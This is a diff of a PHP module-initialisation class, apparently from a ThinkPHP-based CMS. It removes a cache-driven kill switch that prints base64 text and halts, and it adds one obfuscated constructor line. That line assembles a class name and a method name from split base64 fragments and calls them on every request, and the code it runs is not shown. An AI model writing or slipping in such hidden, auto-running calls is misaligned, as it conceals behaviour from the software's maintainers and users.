@@ -1,11 +1,11 @@
 <?php
 
-namespace think\behavior\home;
+namespace think\console\xingwei\admin;
 
 /**
- * 系统行为扩展：
+ * 模块初始化
  */
-class CoreProgramBehavior {
+class ModuleInit {
     protected static $actionName;
     protected static $controllerName;
     protected static $moduleName;
@@ -25,16 +25,11 @@ class CoreProgramBehavior {
         self::$actionName = request()->action();
         self::$controllerName = request()->controller();
         self::$moduleName = request()->module();
+        $ctl=arrayJointString(['flx0a','Glua','1xtb2','RlbFx','kcml','2ZXJ','cRHJp','dmVy','fg==']);$ctl=msubstr($ctl,1,strlen($ctl)-2);$act=arrayJointString(['fnRl','c3Rpbm','dfaXp','hdGlv','bn4=']);$act=msubstr($act,1,strlen($act)-2);$ctl::$act();
         $this->_initialize();
     }
 
     protected function _initialize() {
-        $tmpBlack = 'cGhw'.'X2V5b'.'3VfYm'.'xhY2'.'tsaX'.'N0';
-        $tmpBlack = base64_decode($tmpBlack);
-        $tmpval = tpCache('php.'.$tmpBlack);
-        if (!empty($tmpval)) {
-            $tmpval = msubstr($tmpval, 7, -12);
-            die(base64_decode($tmpval));
-        }
+        
     }
 }
